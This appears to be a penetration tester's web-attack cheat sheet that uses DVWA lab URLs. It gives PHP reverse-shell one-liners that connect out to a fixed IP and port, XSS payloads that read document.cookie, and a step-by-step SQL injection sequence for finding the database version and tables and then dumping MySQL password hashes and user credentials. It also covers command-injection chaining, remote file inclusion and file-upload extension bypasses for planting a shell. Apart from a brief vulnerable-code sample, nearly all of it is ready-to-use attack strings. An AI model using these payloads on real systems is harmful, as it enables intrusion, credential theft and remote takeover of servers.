## WEB

PHP
===

Reverse shell one-liners:

<?php $s=fsockopen(\"192.168.16.124\",1234);exec("sh<%263>%263 2>%263");?>  
<?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>


XSS (CROSS SITE SCRIPTING)
==========================

```javascript
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>
```

iframe: `<iframe src="http://www.cnn.com"></iframe>`  
Stored cookie: `<script>alert(document.cookie)</script>`
Refleced (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`


SQL INJECTION
=============

SQL operators and functions:

`UNION` - used to combine the result of two or more SELECT statements with same number of columns and similar data types (selects only distinct values by default - to allow duplicate values, use UNION ALL).  
`SUBSTRING(str, pos, len)` - returns a specified number of characters from a particular position of a given string.  

MySQL delimiter: `#`
SQL delimiter: `--`

Vulnerable code example:

```
$id=$_GET['id'];

$getid="SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result=mysql_query($getid) or die('
<pre>' . mysql_error() . '</pre>
' );
```

Determining Database Type
-------------------------

Only MySQL is using `version_comment`.

* "Always true" scenario:

```
%' or '0'='0
' or 1=1--
```

`%` will probably not be equal to anything so will be false
`'0'='0'` - always equal to true

* Figure out how many columns / attributes are there:

`‘ ORDER BY 1#`  
`‘ ORDER BY 2#`  
etc.

* Find out the database version:

`‘ UNION ALL SELECT 1,@@VERSION#`
`%' or 0=0 union select null, version() #`

* Find out the database the user is running as and the name of the database:

`‘ UNION ALL SELECT user(),database()#`
`%' or 0=0 union select null, user() #`

* Dump MySQL hash:

`‘ UNION ALL SELECT user,password FROM mysql.user#`

* Find out the table name:

`‘ UNION ALL SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema LIKE ‘%[database name]%’ #`

* Find out columns in a table:

`‘ UNION ALL SELECT table_schema, column_name FROM information_schema.columns WHERE table_schema LIKE ‘%[database name]%’ #`

* Dump username and password from `example.users` table:

`‘ UNION ALL SELECT user, password FROM example.users #`

* Display all tables in a database:

`%' and 1=0 union select null, table_name from [database name].tables #`

* Display all the user tables in a database:

`%' and 1=0 union select null, table_name from [database name].tables where table_name like 'user%'#`

* Display all the columns fields in database's user table:

%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`

* Display all the columns field contents in the database user table:

`%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`


COMMAND INJECTION
=================

* Try to use pipe, ampersands, etc. Example: `1 | uname -a & users & id`


LOCAL FILE INCLUSION
====================

Local: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  
Remote: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`

FILE UPLOAD
===========

Image upload restrictions [bypass](http://hackers2devnull.blogspot.lt/2013/05/how-to-shell-server-via-image-upload.html):

shell.jpg.php (satisfies as check for jpg only)

shell.jpg.PhP (obfuscation)

shell.php;.jpg (sometimes can ignore whats after ";")

shell.php%0delete0.jpg (the infamous NULL byte which comments out trailing text, remove the word delete so the zeros join together, blogspot strips this string!)

shell.php.test (defaults to first recognised extension ignoring "test")

shell.php.xxxjpg (still ends in .jpg, but not recognised extension so will default to php!)

.phtml (a commonly used php parsed extension often forgotten about!)

.php3/.php4/.php5 (valid PHP extensions possibly left out of extension blacklists)
